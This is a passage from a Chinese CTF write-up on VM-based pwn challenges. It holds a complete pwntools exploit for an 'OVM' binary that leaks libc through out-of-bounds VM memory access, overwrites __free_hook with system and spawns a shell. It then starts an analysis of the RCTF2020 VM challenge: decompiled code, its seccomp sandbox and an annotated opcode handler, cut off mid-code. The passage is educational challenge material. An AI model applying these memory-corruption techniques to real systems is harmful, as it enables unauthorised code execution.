class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#exit</span></code></pre><p>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./OVM'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./OVM'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'OVM'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v2] + reg[v3]</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v3] &lt;&lt; reg[v2]</span><span class="token keyword">def</span> <span class="token function">left_shift</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = memory[reg[v2]]</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#memory[reg[v2]] = reg[v4]</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># reg[v4] = (unsigned __int8)v2</span><span class="token keyword">def</span> <span class="token function">setnum</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token punctuation">[</span>    setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[0]=8</span>    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=0xff</span>    setnum<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=0xff</span>    left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xff&lt;&lt;8=0xff00)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1](reg[2]=0xff00+0xff=0xffff)</span>    left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffff&lt;&lt;8=0xffff00)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1](reg[2]=0xffff00+0xff=0xffffff)</span>    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=0xc8</span>    <span class="token comment" spellcheck="true"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffffff&lt;&lt;8=0xffffff00)</span>    left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1](reg[2]=0xffffff00+0xc8=0xffffffc8=-56)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[3]=memory[reg[2]]=memory[-56]</span>    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=1</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1]=-56+1=-55</span>    read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[4]=memory[reg[2]]=memory[-55]</span>    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=0x10</span>    left_shift<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=reg[1]&lt;&lt;8=0x10&lt;&lt;8=0x1000</span>    setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[0]=0x90</span>    <span class="token comment" spellcheck="true"># reg[1]=reg[1]+reh[0]=0x1000+0x90=0x1090 &amp;free_hook-8-&amp;stdin=0x1090</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[3]=reg[3]+reg[1]</span>    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=47</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+2=-55+47=-8</span>    write<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># memory[reg[2]]=memory[-8]=reg[3]</span>    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=1</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+1=-8+1=-7</span>    write<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># memory[reg[2]]=memory[-7]=reg[4]</span>    u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># exit</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'PC: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'SP: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'SIZE: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'CODE: '</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> code<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#sleep(0.2)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'R3: '</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>last_4bytes <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'last_4bytes => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>last_4bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'R4: '</span><span class="token punctuation">)</span>first_4bytes <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'first_4bytes => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>first_4bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> <span class="token punctuation">(</span>first_4bytes <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>last_4byteslibc_base <span class="token operator">=</span> free_hook<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OVM?\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x3-RCTF2020-VM"><a href="#0x3-RCTF2020-VM" class="headerlink" title="0x3.RCTF2020 VM"></a>0x3.RCTF2020 VM</h2><p>这题跟着ruan师傅的wp来复现</p><p>检查保护</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C11.jpg" alt="11"></p><p>IDA分析</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C12.jpg" alt="12"></p><p>先看到vm_start函数</p><pre class=" language-c"><code class="language-c">_QWORD <span class="token operator">*</span><span class="token function">vm_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _QWORD <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>  v1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC</span>  <span class="token function">set_stack</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> <span class="token number">0x800u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//stack</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>再跟到set_stack函数中看看</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">set_stack</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;=</span> <span class="token number">0xFF</span> <span class="token operator">||</span> a2 <span class="token operator">></span> <span class="token number">0x1000</span> <span class="token punctuation">)</span>    <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid size!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a2 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x5C</span><span class="token punctuation">)</span> <span class="token operator">=</span> a2 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>pwndbg里查看一下</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C13.jpg" alt="13"></p><p>继续往下看，循环读入code，之后会fork一个子进程，if语句中有一个沙箱</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_A3A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  __int16 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_203020<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>禁用了execve，因此我们只能通过orw来拿到flag</p><p>沙箱之下有一个check函数，check函数稍后再看，我们需要先弄清楚code是什么，往下看run函数，run函数接收两个参数，a1是vm结构体的指针，a2是经过了check之后的code的数量。</p><p>run函数很长，篇幅原因就挑几个分析一下。</p><pre class=" language-c"><code class="language-c">v7 <span class="token operator">=</span> a2<span class="token punctuation">;</span> v34 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v30 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取PC区第一个code的第一字节，标志类型</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">7</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第一字节为7</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1</span>  <span class="token punctuation">{</span>    v13 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v13 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token function">take_value_QWORD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//以第三字节为索引，将8LL * v13 + a1中的值与code后8字节异或</span>    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0xB</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针往后移到第二个code，1+1+1+8=11</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//如果第二字节不为1</span>  <span class="token punctuation">{</span>    v12 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第3字节</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v12 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//以第四字节为索引，取出8LL * (unsigned __int8)take_value(v30 + 3) + a1中的值，与*(_QWORD *)(8LL * v12 + a1)中的值异或</span>    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移，1+1+1+1=4</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//xor功能标志位为7，通过第二字节是否为1，可以指定寄存器中的值与code中的数值异或，或者两个寄存器中的值进行异或</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token 